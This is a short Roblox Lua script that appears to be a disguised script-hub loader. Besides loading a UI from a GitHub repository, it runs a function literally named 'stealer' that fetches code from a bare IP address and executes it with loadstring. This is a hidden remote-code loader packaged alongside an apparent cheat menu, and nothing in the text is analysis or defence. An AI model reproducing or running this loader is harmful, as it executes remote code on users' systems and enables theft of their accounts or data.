local function stealer()
     ID="074bb868-c09e-41bd-a308-0f74a4a0a554";
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/snthnova/Snthnova-Hub/refs/heads/main/AdmLua"))()
end
task.spawn(stealer)
task.spawn(loadui)
